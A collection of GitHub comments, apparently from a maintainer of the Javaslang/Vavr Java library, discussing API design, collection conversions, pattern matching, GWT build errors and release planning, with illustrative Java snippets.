Void[] { null });\n    } else {\n        assertThat(array).isEqualTo(new Void[] { null, null });\n    }\n}\n. Note: This is a working change but I will probably push --force some optimizations of the algorithm. It is currently hacked from the brain to the keyboard...\n. Will fix the tests tomorrow - seems to be the isSingleValued check and maybe unpredictable order of sets... Need to adjust the asserts.\nLazy me, checked it only for Lists. However, it does work like a charm - in iteration order...\n. There are still open issues regarding the conversion method:\n- we need to go multiple levels down (but only one up) at a time\n- we need to use a defaultValue instead of null\n- Tree needs Tree.ofAll(Stream s, Comparator c, T defaultValue) (maybe also a default value Supplier variant?)\n. @ronanM Yes, will do it!\n. Thank you! It is a better choice to depend on an OpenJDK standard lib.\n(I wonder if there is an impact of the warning. The tests still run. Do they have an appropriate accuracy regarding memory measurement?)\n. Ok \ud83d\udc4c \n. Ready for review!\n. Oh, javadoc formatting scrambled - will push --force a better version...\n. Latest commit takes ExecutorService latency into account (including tests)\n. @paplorinc by accident during a late-night coding session. thank you!\nUpdate: Ah! It was closed automatically because I did some cleanup of branches but this one is still needed. I restored it.\n. Maybe we should use ScheduledExecutorService resp. ScheduledThreadPoolExecutor in order to decorate tasks...\nhttp://download.java.net/java/jdk9/docs/api/java/util/concurrent/ScheduledThreadPoolExecutor.html. We could also stay with toJavaStream() and add toJavaParallelStream().\n. Fixed, thank you :)\n\n. Note: Next week I meet Stefan Oehme (Gradle Gmbh) in Kiel to create a Gradle build for Javaslang.\n. We will move to Gradle and optimize the build #1277 \n. @paplorinc The travis CI build time does not matter to me. It is the local build time that matters when I cherry-pick commits for a release.\nWhen switching to Gradle I will add options to disable GWT tests and Benchmarks. I will run these once before pushing.\n. I think it can be configured with Maven Surefire Fork option\n. Great thank you! Will include it in release 2.0.4 which is coming this weekend.\n. Regarding the gitter discussion @benoitheinrich mentioned I came to the conclusion that we already have to more general method:\njava\n<U extends V> Map<K, V> put(K key, U value, BiFunction<? super V, ? super U, ? extends V> merge);\nThere could be the following variations:\njava\n<U extends V> Map<K, V> put(K key, Supplier<U> value, BiFunction<? super V, ? super U, ? extends V> merge);\nMap<K, V> put(K key, Supplier<? extends V> value, Function<? super V, ? extends V> merge);\nMap<K, V> put(K key, V value, Function<? super V, ? extends V> merge);\nBut adding these variations blows up the API. The existing put(K, U, BiFunction<V, U, V>) should be sufficient for now.\n. @mduesterhoeft Great to have you onboard! This issue focuses only on the three additional methods mentioned in the first comment. (The other suggestions are in fact covered already by put.)\nWe have a Map hierarchy and a Multimap hierarchy. The impls of the existing replace* methods delegate to the internal Maps helpers.\nMany thanks :)\n. @mduesterhoeft That's right - thanks :). @ashrko619 Hi, could you please give me a status update? I'm currently consolidating all open issues/PRs. Thank you :)\n. \u2728\ud83d\udc4d\ud83c\udffd\ud83d\ude04\ud83d\udc4d\ud83c\udffd\u2728\n. @ashrko619 this one is also nearly finished, right? Please merge to resolve conflicts, I'm looking forward to pull this one. Thank you.\n. Many thanks!. Yes. We will not change existing methods. So let's target 2.1.0 :)\n. @ruslansennov Is this s.th. for you? No hurry here...\n. We haven't defined a standard for deprecation yet. Currently I use the following:\n- annotate methods with @Deprecated\n- add javadoc @deprecated <description>\nDescriptions are one of or a combination of these:\n- Should not be used any more because ... (e.g. it is unsafe)\n- Will be removed in a future version.\n- ...\n. Great :)\n. @ruslansennov Yes, aggreed! I should have seen that.\n. Thanks Ruslan. Yes, we need to remove these ambiguities from API.\nAPI will only have aliases for of(T) and of(T...) for the collections. Maps and sorted collections will have slightly different methods (Map will have of(KVKV), the sorted collections will have a variant with a Comparator).\nSee #1651 \nFor now it will be sufficient to have these aliases.\n. @ruslansennov Need to double-check it but I think you finished this ticket already!\n. Done. @SimY4 Oh, thank you! - and sorry. I have overseen that. #1473 was the only (!) PR we merged into another branch yet. We did merge all other PR's that target 3.0.0 into master. Therefore I removed the 3.0.0 branch.\n. @ashrko619 I meant Traversable.reverseIterator(). Currently Collections.scanRight() is implemented like this:\njava\nstatic <T, U, C extends Iterable<U>, R extends Traversable<U>> R scanRight(\n        Iterable<? extends T> elements,\n        U zero, BiFunction<? super T, ? super U, ? extends U> operation,\n        C cumulativeResult, BiFunction<C, U, C> combiner,\n        Function<C, R> finisher\n) {\n    final Iterator<? extends T> reversedElements = reverseIterator(elements);\n    return scanLeft(reversedElements, zero, (u, t) -> operation.apply(t, u), cumulativeResult, combiner, finisher);\n}\nIf we had the possibility to iterate the elements in reverse order (which is efficiently possible for IndexedSeq for example), the implementation could look like this:\njava\nstatic <T, U, C extends Iterable<U>, R extends Traversable<U>> R scanRight(\n        Iterable<? extends T> elements,\n        U zero, BiFunction<? super T, ? super U, ? extends U> operation,\n        C cumulativeResult, BiFunction<C, U, C> combiner,\n        Function<C, R> finisher\n) {\n    final Iterator<U> iterator = traversable.reverseIterator().scanLeft(zero, (u, t) -> operation.apply(t, u));\n    return finisher.apply(iterator);\n}\n(note: code not tested)\n. I think you looked at the wrong file. Here is my content of javaslang.collection.Collections:\n``` java\n    static , R extends Traversable> R scanLeft(Iterable<? extends T> elements,\n                                                                              U zero, BiFunction<? super U, ? super T, ? extends U> operation,\n                                                                              C cumulativeResult, BiFunction combiner,\n                                                                              Function finisher) {\n        U acc = zero;\n        cumulativeResult = combiner.apply(cumulativeResult, acc);\n        for (T a : elements) {\n            acc = operation.apply(acc, a);\n            cumulativeResult = combiner.apply(cumulativeResult, acc);\n        }\n        return finisher.apply(cumulativeResult);\n    }\nstatic <T, U, C extends Iterable<U>, R extends Traversable<U>> R scanRight(Iterable<? extends T> elements,\n                                                                           U zero, BiFunction<? super T, ? super U, ? extends U> operation,\n                                                                           C cumulativeResult, BiFunction<C, U, C> combiner,\n                                                                           Function<C, R> finisher) {\n    final Iterator<? extends T> reversedElements = reverseIterator(elements);\n    return scanLeft(reversedElements, zero, (u, t) -> operation.apply(t, u), cumulativeResult, combiner, finisher);\n}\n\n```\nYou are right, we do not need to add reverseIterator() to Traversable.\nInstead this line should be changed in Collections.reverseIterator():\n``` diff\n@SuppressWarnings(\"unchecked\")\nstatic  Iterator<? extends T> reverseIterator(Iterable<? extends T> iterable) {\n    if (iterable instanceof java.util.List) {\n        final java.util.List list = (java.util.List) iterable;\n        return new Iterator() {\n            java.util.ListIterator delegate = list.listIterator(list.size());\n        @Override\n        public boolean hasNext() { return delegate.hasPrevious(); }\n\n        @Override\n        public T next() { return delegate.previous(); }\n    };\n\n\n} else {\nfinal Seq<? extends T> result = (iterable instanceof Seq) ? (Seq) iterable\n: Vector.ofAll(iterable);\nreturn result.reverseIterator();\n} else if (iterable instanceof Seq) {\nreturn ((Seq) iterable).reverseIterator();\n} else {\nreturn Iterator.ofAll(iterable).foldLeft(List. empty(), List::prepend).iterator();\n    }\n}\n```\n. @ashrko619 Thank you, I was confused. Yes, we can change the signature of Collections.scanRight.\n. @ashrko619 Thank you for your suggestions. I looked a bit through the code and think it should look like this:\n\n``` java\nclass Collections {\nstatic <T, U, R extends Traversable<U>> R scanLeft(Traversable<? extends T> traversable,\n        U zero, BiFunction<? super U, ? super T, ? extends U> operation, Function<Iterator<U>, R> finisher) {\n\n    final Iterator<U> iterator = traversable.iterator().scanLeft(zero, operation);\n    return finisher.apply(iterator);\n}\n\nstatic <T, U, R extends Traversable<U>> R scanRight(Traversable<? extends T> traversable,\n        U zero, BiFunction<? super T, ? super U, ? extends U> operation, Function<Iterator<U>, R> finisher) {\n    final Iterator<U> iterator = reverseIterator(traversable).scanLeft(zero, (u, t) -> operation.apply(t, u));\n    return finisher.apply(iterator);\n}\n\n}\n```\n(plus the changes to the reverseIterator() method mentioned in this comment)\nAfter changing the methods, this test should produce the same results:\n``` java\nimport javaslang.collection.Array;\nimport java.util.function.BiFunction;\nimport static javaslang.API.*;\npublic class Test {\npublic static void main(String[] args) {\n\n    Array<Integer> a = Array(1, 2, 3);\n    BiFunction<Integer, Integer, Integer> product = (i, j) -> i * j;\n\n    // Array(10, 10, 20, 60)\n    println(a.scanLeft(10, product));\n\n    // Array(60, 60, 30, 10)\n    println(a.scanRight(10, product));\n\n}\n\n}\n```\n. Hi @ashrko619, you are right! The result needs to be reversed before applying the finisher - thank you.\n. fixed with #1684 . Thank you!\n. Great, thank you! :)\n. Great, thanks :)\n. Would it make sense to create a GWT ExecutorService impl that uses native JS to call ES6 Promise in order to perform async calls?\n. @dharezlak yes, I think you are right. Wonder why Promise exists at all. Because of the error handling?\nFunction:\njavascript\nfunction getUser(userId) {\n  return new Promise((resolve, reject) => {\n    try {\n      resolve(db.getUserById(userId));\n    } catch(error) {\n      reject(`Error loading user ${userId}: ${error}`);\n    }\n  });\n}\nUsage:\njavascript\ngetUser('phantasy-id')\n  .then(user => {\n    // do something with loaded user\n  })\n  .catch(error => {\n    // update UI with error message\n  });\n. Hey guys, I looked through the changes and have some thoughts:\n- Generally we should not include 3rd party framework specific stuff into the javaslang core module. Here we added super-sources. Why can't those reside within the javaslang-gwt module?\n- Copying the Javaslang sources to a super-sources folder is no good idea. It leads to maintenance hell. The original sources and the super-sources will diverge over time.\n- Including the JDK sources is not a good idea. Who is keeping them actual? It is bound to a specific JDK version. Javaslang will run on multiple JDK versions. We can't include every version of a JDK file at the same time.\n- Including sources that are used by current impls (like FutureImpl -> AtomicInteger) is also not a good idea. When changing FutureImpl, some dependencies might be obsolete. Zombies (like AtomicInteger in this example) will reside in our code-base.\nThe bottom line is that we can't add features to GWT client code like this...\nWhat are your thoughts @dharezlak @ruslansennov ?\n. @dharezlak @ruslansennov Thank you for your suggestions.\nI like the idea of only one include javaslang-gwt when using Javaslang with GWT. We should move all stuff to that module and deploy it.\nThis PR should not include any changes to Javaslang core.\n. > Will these give us a green light towards 2.1.0 release?\nfrom my point of view yes. @ruslansennov, does this make sense to you?\n. Hi @dharezlak, this looks great now! I will pull it in now.\nCould you please re-add the Gwt-Example in its own non-deployable module?\nLet's name it javaslang-gwt-example containing @ruslansennov's readme that describes how to setup and start the  example in the browser. (see #1625)\nMany thanks!!\n. Awesome :)\n. Thank you!!\n. Fixes #1261\n. Makes sense!\n(PRs greatly appreciated!)\n. Great, thank you Daniel!\n. Awesome, great Javadoc - thx!\n. Awesome, thank you!\n. That was fast, thank you!\n. Great, thank you!\n. I see. I tested it only in IntelliJ, which does not break the build on warnings. There are also other ambiguities:\n\nNote: In this example my impl of the deprecated methods throws in order to double-check at runtime which method was really called.\nNow we have three choices:\n- disable the build error on compiler warnings in the pom --> No.\n- don't ship this change with a minor release (e.g. 2.1.0) --> Don't want to do that because of safety.\n- remove the deprecated method(s) and break compatibility --> Maybe this :-/\n. Please remove all of(Object...) and of(Comparator, Object...) methods. And I mean all!\nIf we break, then the right way. These methods are unsafe. Having them, even if deprecated, is a risk for our users.\n. @ruslansennov don't do that. what would be the minimal-invasive solution? just removing the ambiguous TreeMap.of(Comparator, Object...) method, right?\n. > Yes, removing all factory methods with Object... argument and replacing with KVKV\n@ruslansennov I'm torn back and forth - but I think you are right. These methods are a pain in the ass. Keeping them as @Deprecated would not prevent from using them. We need to remove the methods containing Object... args also from the Multimap*.Builder classes.\n. @paplorinc \n\nI suggest making merge a vararg, to allow comfortable concatenation :)\n\nIt would blow up the API too much. For more than 10 args the ofEntries method is used (e.g. in conjunction with the Tuple(K, V) alias). It is evil enough that we now have all these *Map.of(KVKVKVKV...) methods.\nLet's not throw in too much new API when we do not know how frequently it is used at all...\n/cc @ruslansennov @valery1707 \n. > please leave this PR unmerged for a while\nOk, will do!\n. detailed in #1635 \n. Awesome, thank you!\n. The from* methods do not scale well, several types need them. Maybe we can add the missing Value.toValidation() methods, e.g.\n``` java\ninterface Value {\ndefault <E> Validation<E, T> toValidation(E error) {\n    return isEmpty() ? Validation.invalid(error) : Validation.valid(get());\n}\n\ndefault <E> Validation<E, T> toValidation(Supplier<? extends E> errorSupplier) {\n    return isEmpty() ? Validation.invalid(errorSupplier.get()) : Validation.valid(get());\n}\n\n}\n```\nThen we are able to call\n``` java\nsomeOption.toValidation(\"errorValue\");\nsomeTry.toValidation(() -> \"errorValue\");\nsomeFuture.toValidation(() -> \"errorValue\");\nsomeEither.toValidation(() -> \"errorValue\");\nsomeList.toValidation(() -> \"errorValue\");\n...\n```\ninstead of\n``` java\nValidation.fromOption(someOption, \"errorValue\");\nValidation.fromTry(someTry, () -> \"errorValue\");\n...\n```\n. @DanielGronau I think this is better:\n``` java\ninterface Value {\ndefault <E> Validation<E, T> toValid(E error) {\n    return isEmpty() ? Validation.invalid(error) : Validation.valid(get());\n}\n\ndefault <E> Validation<E, T> toValid(Supplier<? extends E> errorSupplier) {\n    return isEmpty() ? Validation.invalid(errorSupplier.get()) : Validation.valid(get());\n}\n\ndefault <U> Validation<T, U> toInvalid(U value) {\n    return isEmpty() ? Validation.invalid(get())) : Validation.valid(value);\n}\n\ndefault <U> Validation<T, U> toInvalid(Supplier<? extends U> valueSupplier) {\n    return isEmpty() ? Validation.invalid(get())) : Validation.valid(valueSupplier.get());\n}\n\n}\n```\n. Traversables are already convertable too all kind of Values vice versa, because Traversable is a Value and inherits all toXxx() conversion methods.\nFor example this will be possible:\n``` java\nsomeList.toValid(\"someError\");\nsomeValidation.toList();\n```\nHowever, traversable.toOption() only considers the first value. Also Value.get() returns only the first value:\n``` java\nList(1, 2, 3).toOption() == Some(1)\nList().toOption() == None()\nList(1, 2, 3).get() == 1\nList().get() throws\n```\n@DanielGronau Do you still see a TODO for Traversable here?\n. I think having one value is the only way that the Monad laws still hold. I will check that...\nAlso conversion methods should be symmetric, e.g.\n``` java\n// currently\nSome(1).toList() --> List(1)\nNone().toList() --> List()\n// Not possible with Java.\n// It could be done only if we know that the underlying type is Option\nSome(List(1, 2, 3)).toList() --> List(1, 2, 3)\nSome(List()).toList() --> List()\nNone().toList() --> ???\n```\nUpdate:\nConversion behaves 'as expected by users' between Traversables:\njava\nList(1, 2, 3).toSet() --> Set(1, 2, 3)\nFor single-valued types we also expect this:\njava\nSome(1).toSet() --> Set(1)\nWhen converting multi-valued types to single-valued types, this is the only way that makes sense (however, it isn't symmetric):\njava\nSet(1, 2, 3).toOption() --> Some(1)\nSome(1).toSet() --> Set(1)\nWe need to do it this straight forward way. Otherwise the behavior will look invented  and turns to be magic if we change the impl of Traversable.toOption(). This is the reason why we have the method Value.isSingleValued(), it tells us how the Value does behave:\n``` java\nValue value1 = List(1, 2, 3);\nValue value2 = Option(1);\n// false\nvalue1.isSingleValued();\n// true\nvalue2.isSingleValued();\n```\nBy converting a multi-valued type to a single-valued type it is clear that only the first value is taken (if exists).\nOtherwise we need to do it like this:\njava\n// = Some(List(1, 2, 3)), instead of List(1, 2, 3).toOption() which is Some(1)\nOption(List(1, 2, 3))\n. @CauchyPeano the link is fixed (the old domain name javaslang.io expired last week). @nfekete Thank you for the hint! I will fix them!\nUpdate: Fixed all 27 articles \ud83d\ude0a. Hi @CauchyPeano,\n\nfollowing this broken links topic - there are also images links broken:\n\nI fixed the image - it wasn't the link, it was a changed behavior of the markdown renderer in the the Ghost blog version.\nBefore I used this snippet to change the size of an image:\nhtml\n<div style=\"max-width:406px !important\">\n![for-benchmark](/content/images/2016/10/for-benchmark-1.png)\n</div>\nNow I have to use this code instead:\nhtml\n<img style=\"max-width:406px !important\" alt=\"for-benchmark\" src=\"/content/images/2016/10/for-benchmark-1.png\">\n. @CauchyPeano \n\nCan you maybe provide some examples how it should look like?\n\nWe need to change the code generator for vavr/src-gen/main/java/io/vavr/API.java, located in vavr/generator/Generator.scala.\nWlog, currently we have:\njava\npublic static <T1> For1<T1> For(Iterable<T1> ts1) { ... }\nBasically, we need additional method overloads for all monadic types.\njava\npublic static <T1> For1<T1> For(Option<T1> monad1) { ... }\nWe start with Option, Try, Either, Future and Validation. We will decide later if we do the same for all collection types (or just Seq, (Multi)Set, (Multi)Map, ... - or something else).\nWe will not add classes in addition to the existing  API.For1, ..., API.For8. Currently we have:\n```java\n    public static class For1 {\n    private final Iterable<T1> ts1;\n\n    private For1(Iterable<T1> ts1) {\n        this.ts1 = ts1;\n    }\n\n    public <R> Iterator<R> yield(Function<? super T1, ? extends R> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return Iterator.ofAll(ts1).map(f);\n    }\n\n    public Iterator<T1> yield() {\n        return yield(Function.identity());\n    }\n}\n\n```\nBut we need to substitute Iterable with Value (and pull out the Iterator factory method call) in order to make For1..8 reusable:\n```java\n    public static class For1, MR extends Value> {\n    private final MT1 monad1;\n\n    private For1(MT1 monad1) {\n        this.monad1 = monad1;\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    public <R> MR yield(Function<? super T1, ? extends R> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return (MR) monad1.map(f);\n    }\n\n    public MT1 yield() {\n        return yield(Function.identity());\n    }\n}\n\n```\nMaybe we need to treat the generics a bit in order to make it compile...\nUpdate: The MT1..MT8, MTR abstraction will not work for flatMap this way. Maybe we need to pass a function instead, that creates an appropriate type. I will come up later today with a working solution for the Option example.. @CauchyPeano For now you can leave the method signature as is and change the implementation like this:\njava\npublic static <T1> For1<T1> For(Iterable<T1> ts1) {\n    Objects.requireNonNull(ts1, \"ts1 is null\");\n    return new For1<>(Iterator.ofAll(ts1));\n}\nYou pull the Iterator.ofAll out of the For1..8 class constructor, up to the calling method.\n(Iterator is part of io.vavr.collection)\nUpdate: But we will still have problems with flatMap because it is not part of Value. I try to provide you with an update this evening.... @CauchyPeano Thx!\nFor loops iterate over Iterables. An Iterable does not need necessarily be a collection. I would stick with Iterator for now. It has a very small memory and cou footprint.\nLater we might add more overloads for collections.\n\u2014-\nI did not spend time on flatMap, yet. I have some ideas but need to test a bit. Will come back tomorrow.... Unfortunately flatMap does not work for Value because Java is missing higher-kinded types (aka type constructors).\nSo the solution should have separate For-overloads for each of our value implementations. I.e.\n```java\npublic static  For1 For(Try t1) { ... }\npublic static  For2 For(Try ts1, Try ts2) { ... }\n// ... up to For8\npublic static  For1 For(Option t1) { ... }\npublic static  For2 For(Option ts1, Option ts2) { ... }\n// ... up to For8\n// etc\n```\nWe need to utilize the Generator.scala...\n. (Copied from this discussion)\nWe would need a common Monadic interface that is implemented by our 'sealed' classes (like Option, Try, List, ...). This type has to be a recursive self-type, like:\n```java\ninterface Monadic, T> {\n<U> Monadic<M, U> flatMap(Function<? super T, ? extends Monadic<? extends M, ? extends U>> mapper);\n\n<U> Monadic<M, U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\nI will remove the common Value interface, because it does not work well in conjunction with checked functions. E.g. Option will have flatMap(Function), Try will have flatMap(CheckedFunction).\nGiven that, we would also need a CheckedMonadic interface:\n```java\ninterface Monadic, T> {\n<U> Monadic<M, U> flatMap(CheckedFunction<? super T, ? extends Monadic<? extends M, ? extends U>> mapper);\n\n<U> Monadic<M, U> map(CheckedFunction<? super T, ? extends U> mapper);\n\n}\n```\nUsing the above interfaces, we could reduce the overall amount of For methods to (Monadic, CheckedMonadic) x (1..8) = 16 classes. This amount will stay constants when supporting more types, like Either, Future, Stream, ...\nHowever, the flatMap API will be uglified regarding the sketched solution because the mapper requires a recursive self-type (e.g. CheckedMonadic<Try<?>, U>) instead of a concrete type Try<U>. In turn, the return types of map and flatMap could be overloaded with concrete types.\nI will defer the decision a bit if we use recursive self-types for map and flatMap (but I think, it is the right solution and it will open a whole new space for creating new APIs/better functionality).. See https://github.com/vavr-io/vavr/pull/2281#issuecomment-410884413. It is wrong by me to try to fix it by overriding the numeric methods in Maps. It increases the overall complexity of the application. It is a sign that the design is wrong. Also it will be a reason to move to 3.0.0 to get it right from the user-perspective.\nThis should be solved straight-forward by letting Map extends Traversable<V> instead of Traversable<Tuple2<K, V>>.\nWorkaround: map.values().sum();\n. @ruslansennov Help needed! GWT complains\n\nThe method printf(String, Object[]) is undefined for the type PrintStream\n\nMay it be a problem with varargs calls? We have:\njava\npublic final class API {\n    public static void printf(String format, Object... args) {\n        System.out.printf(format, args);\n    }\n}\n*) System.out is the PrintStream\nThis is the build error:\nbash\n[INFO] --- gwt-maven-plugin:1.0-rc-6:compile (default-compile) @ javaslang-gwt-example ---\n[INFO] Compiling module JavaslangExample\n[INFO]    Ignored 10 units with compilation errors in first pass.\n[INFO] Compile with -strict or with -logLevel set to TRACE or DEBUG to see all errors.\n[INFO]    [ERROR] Errors in 'jar:file:/home/travis/build/javaslang/javaslang/javaslang/target/javaslang-3.0.0-SNAPSHOT-sources.jar!/javaslang/API.java'\n[INFO]       [ERROR] Line 161: The method printf(String, Object[]) is undefined for the type PrintStream\n[INFO]    Tracing compile failure path for type 'javaslang.API'\n[INFO]       [ERROR] Errors in 'jar:file:/home/travis/build/javaslang/javaslang/javaslang/target/javaslang-3.0.0-SNAPSHOT-sources.jar!/javaslang/API.java'\n[INFO]          [ERROR] Line 161: The method printf(String, Object[]) is undefined for the type PrintStream\n[INFO]    [ERROR] Hint: Your source appears not to live underneath a subpackage called 'client'; no problem, but you'll need to use the <source> directive in your module to make it accessible\n. @ruslansennov Thank you for the link!\n. Thank you, that's right! We will fix it.\n(Note to myself: Maybe Vector or Array will be faster because they need not to be reversed)\n. @mduesterhoeft Please take a look at Map.traverse() and Multimap.traverse().\nThe List.append() calls are O(n) for each append. The foldLeft calls append n times => we have an overall O(n^2).\nThere are two possibilities to solve this issue:\n1) Use another Seq implementation than List. Vector is the way to go!\n2) Eliminate append() and use prepend() instead. Then foldLeft(...).reverse() all the things.\nList has the least memory overhead but is iterated again when calling reverse(). Therefore I think we should implement 1) instead and use Vector.\n. I think this will lead to new problems. It needs to be investigated before taking further steps.. Simply spoken: It does not work.\n\nOur solution will look like this:\nMap\n```java\npublic interface Map extends Traversable> {\n@Override\n<U> Traversable<U> flatMap(Function<? super Tuple2<K, V>, ? extends Iterable<? extends U>> mapper);\n\n<K2, V2> Map<K2, V2> flatMap(BiFunction<? super K, ? super V, ? extends Iterable<? extends Tuple2<? extends K2, ? extends V2>>> mapper);\n\n@Override\n<U> Traversable<U> map(Function<? super Tuple2<K, V>, ? extends U> mapper);\n\n<K2, V2> Map<K2, V2> map(BiFunction<? super K, ? super V, ? extends Tuple2<? extends K2, ? extends V2>> mapper);\n\n}\n```\nSortedMap\n```java\npublic interface SortedMap extends Map {\n@Override\n<U> Traversable<U> flatMap(Function<? super Tuple2<K, V>, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<K2, V2> Map<K2, V2> flatMap(BiFunction<? super K, ? super V, ? extends Iterable<? extends Tuple2<? extends K2, ? extends V2>>> mapper);\n\n<K2, V2> SortedMap<K2, V2> flatMap(Comparator<? super K2> keyComparator, BiFunction<? super K, ? super V, ? extends Iterable<? extends Tuple2<? extends K2, ? extends V2>>> mapper);\n\n@Override\n<U> Traversable<U> map(Function<? super Tuple2<K, V>, ? extends U> mapper);\n\n@Override\n<K2, V2> Map<K2, V2> map(BiFunction<? super K, ? super V, ? extends Tuple2<? extends K2, ? extends V2>> mapper);\n\n<K2, V2> SortedMap<K2, V2> map(Comparator<? super K2> keyComparator, BiFunction<? super K, ? super V, ? extends Tuple2<? extends K2, ? extends V2>> mapper);\n\n}\n```\n. @v1ctor Hi, you are right. I've re-read the specs and CONCURRENT makes no sense when a collection is IMMUTABLE. Thank you!. @v1ctor \n\nHow I understand as our Map implement Traversable> we will have Splititerator> and characteristics for this spliterator we could from introspection methods.\n\nYes, absolutely right!\n\nBut in this case, unfortunately, we can't have SIZED and SUBSIZED characteristics, because we return Seq from values() and this class doesn't have fixed size.\n\nWe don't have to think about this case. The Spliterator of the returned Seq implementation will manage its own characteristics (by introspection). It is all right.. Hi @Pyeroh, thank you for your question! In fact recently there were similar question and always I answered: Option behaves correct, Optional is broken.\nI've done a blog post today because I think your question will not be the last one regarding Some(null):\n~~http://blog.javaslang.io/the-agonizing-death-of-an-astronaut/~~\nUpdate: http://blog.vavr.io/the-agonizing-death-of-an-astronaut/\nI will close this ticket. Please don't hesitate to ask me any further questions!. Thank you!\n. Hi @cluelessjoe (btw - awesome name ;)),\nthe answer is algebraic:\n- foldLeft associates to the left\n- foldRight associates to the right\n- fold is associative, the traversal of elements is unordered/non-deterministic. We say that the arguments to fold form a Monoid.\nThe original answer came from R\u00fanar Bjarnason.\nI will update the javadoc to make it clear. Thank you for your suggestion!\nUpdate: Just saw that the javadoc is wrong! It currently states that the elements are folded from the left (which is an implementation detail).\n. Hi @cluelessjoe,\n\nany plan for a parallel collection on your side?\n\nI thought about it but for the moment it would be too much additional complexity. My plans are to go deeper and not so expanding the lib more.\nCurrently I'm experimenting how Future/Promise could be integrated more tightly into the library. You can see a first step with #1640 (see also the recent blog post).\nJavaslang's Values (not only collections, also monads like Option, Try, Future, ...) are convertible to Java types (back and forth). In the current SNAPSHOT we can use\njava\nList.of(1, 2, 3)\n    .toJavaParallelStream()\n    /*do parallel computations*/\n    .collect(List.collector());\nEach Javaslang collection has a collector() method. With #1635 the splitterators will be optimized for parallel streaming.\nThanks again for asking - I'm preparing the fold javadoc-fix right now! :-)\n- Daniel\n. Maybe this should be closed. The module vavr-collectionx should not depend on vavr-concurrent.. The sync case is fixed with #2121. We will not do the async case.. Thanks for reporting! I will investigate and fix it.\n. Iterator#takeWhile and Iterator#dropWhile are broken:\n1) They continue to apply the given Predicate, even if the test returned false\n2) null is used to indicate 'no more elements' but null is a valid element\n. @ruslansennov fixed it. I think this will raise ambiguities. Why not use Try.run?\n. @whirlwin I thought about your suggestion. I also like to have same factory method names, it is better than learning new API (of, run, ...).\nAlso I verified that of(CheckedSupplier) does not clash with of(CheckedVoidSupplier).\nHowever, with Project Valhalla Supplier<void> will be the same as Runnable (as I understand Brian Goetz' mission statement). So having both methods named of is no good idea from the strategic viewpoint.\nI hope you can live with Try.run(). I will close this PR.\nMany thanks for participating! I hope I will see more PR's from you in future :-)\n. @paplorinc\n\nthe difficulty of implementing the takeWhile originates from the impotence of the Iterator interface.\n\nI know. The Iterator interface is stateful and it has to be. we need to take care of i_de_mpotence of hasNext\n. > I think we could avoid it by working with Streams instead\nNot possible. Like in Scala, Iterator is the only TraversableOnce implementation. It is more memory efficient that Stream because it does not need additional objects per node (like the 'lazy' Supplier of Stream). A stateful Iterator has its use-case and its place in a mature collection library.\nAnd: If Iterator would use Stream under the hood Iterator could be removed from the library.\n. I will merge the fix now. If we need to optimize s.th. we will do it in another PR.\n. Hi @zsolt-donca,\nyou are right, Iterator is only traversable once. We are aware of this issue (see #1295) but it will be a breaking change that is targeted for 3.0.0.\nAlgebraic types are beautiful, because they are simple. Stream is such a sum-type. Basically it has Cons and Empty. The algebraic properties let us use it in a for-comprehension, because it is a sum-type we are able to pattern-match it. We will not add internal magic like \"if it is this or that then we will internally act like this or that\". Algebraic data types do not work like that. What you describe is a universal data structure that is optimized for the underlying characteristics (e.g. finite, could also be indexed vs linear, etc). But that is a completely different approach than ADTs. It does not work for our collections.\nPurely functional data-structures use foldRight to iterate over the elements - Erik Meyer's Haskell Course FP101 gives great insight. But Java is not purely functional, it allows us to mutate elements. Iterator is mutable by definition. When we get next() we cannot go back again. Its use-case is best described by the (future) type-hierachy: TraversableOnce. Stream highly depends on it (as you already described) because Iterator is used as element generator.\nAgain, we align to Scala. Javaslang brings the Scala goodness to Java, and that is on a purpose. It is not a good idea to ignore all the research and effort that was necessary to create Scala's collection library. It is a pool of wisdom. Scala 3.0.0 is in the make, there are already efforts to give the collections a refresh. We need to follow the discussion and to understand the main ideas behind the design. We should not make the mistake to try to be more clever than others and invent collections that are mostly 'engineered' from the low-level performance view-point.\nI hope you understand that Iterator will stay part of Javaslang. Because of its mutable nature, most implementations will be mutable.\n- Daniel\n. > iterators are mutable, aren't referentially transparent: basically, they have all the problems that functional programming is trying to solve.\nBtw - don't confuse it. Mutable state is not evil, shared mutable state is evil!\n. I thought the same several times. We will give the page a fresh look and release it together with 2.1.0. I will make it available under a different url before in order to get some feedback.\n. @pivovarit thank you, I will contact him!\n. See also #1163 . Facts:\nMatch Cases take Patterns.\njava\nMatch(...).of(\n    Case(pattern1, v1 -> ...),\n    Case(pattern2, (v1, V2) -> ...)\n)\nwhere the Pattern hierarchy currently looks like this:\n``` java\ninterface Pattern extends java.util.Function {}\n// a pattern that matches a value and returns that value\nabstract class Pattern0 extends Pattern { ... }\n// a pattern that matches a value and extracts one part\nabstract class Pattern1 extends Pattern { ... }\n// a pattern that matches a value and extracts one part\nabstract class Pattern2 extends Pattern> { ... }\n```\nSome observations:\n1) All Patterns are Functions that implement apply().\n2) The patterns need to be (abstract) classes because having interfaces would lead to ambiguities: To the compiler all Case(Pattern*) variants would look the same because of type erasure.\nMore facts:\n- The compile time annotation processor generates our Patterns. These are upper-case methods like Some(T) and None().\n- The new API aliases overlap with the existing pattern names. For example we also have Some(T) and None().\n\nGoals:\n- We simplify the above by letting our types implement Pattern directly. More specifically we need to extends one of the abstract classes Pattern1..8.\n- Here comes our interface-hierarchy to the rescue. Only the end-points in our type tree are (final) classes. That means we are able to extends one of Pattern1..8.\n- Because we extends Pattern (which is a Function and has apply()), there currently will be clashes. Seq, Set and Map also extends Function. Therefore we need to change Pattern in a non-backward compatible way - we will remove the Function interface from the hierarchy and rename apply() to unapply().\njava\ninterface Pattern<T, R> {\n    Option<R> unapply(T t);\n}\nNote: In 3.0.0 we should add a PartialFunction to the hierarchy that allows us to check, if it is possible to call unapply() - e.g. with isDefinedAt(T) as in Scala. This will save several Option instances, we could return R directly.\nChanges:\n- as mentioned above, Pattern needs unapply() instead of apply()\n- the final classes of the type hierarchy need to extends one Pattern, e.g. Some/None, Success/Failue, List.Cons, List.Nil, etc.\n- The static factory methods of our types need to return the most specific type, e.g. Option.some(T) needs to return a Some<T> instead of a Option<T>, etc.\n- The aliases need also to to return the most specific type (see above)\nNote: We did not return the most specific type to enable the project derive4j to use Javaslang in conjunction with the visitor pattern, as implemented in that project. 